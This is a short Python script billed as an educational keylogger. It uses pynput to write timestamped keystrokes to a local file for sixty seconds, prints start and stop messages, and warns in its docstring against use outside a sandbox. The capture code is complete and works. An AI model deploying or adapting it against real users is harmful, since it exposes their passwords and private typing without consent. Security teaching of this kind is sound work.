"""
Educational Keylogger for Cybersecurity Research
Author: Deepserish BK
Date: 24th June, 025
Description:
  A time-limited keylogger that logs keystrokes to a text file with timestamps.
  Intended for sandboxed environments only. Do not run on production or shared systems.
"""

import pynput
from pynput import keyboard
import time
import threading

# === Configuration ===
LOG_FILE = "keylog_output.txt"
RUN_DURATION = 60  # seconds

def on_press(key):
    """
    Callback function triggered when a key is pressed.
    Logs the key and timestamp to a file.
    """
    current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{current_time} - Key: {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{current_time} - Special Key: {key}\n")

def stop_logger():
    """
    Stops the keylogger after the defined duration.
    """
    time.sleep(RUN_DURATION)
    listener.stop()
    print(f"\n[+] Logging stopped after {RUN_DURATION} seconds. Log saved to {LOG_FILE}")

# === Start Logging ===
print(f"[+] Starting keylogger for {RUN_DURATION} seconds...")
listener = keyboard.Listener(on_press=on_press)
listener.start()

timer_thread = threading.Thread(target=stop_logger)
timer_thread.start()

listener.join()
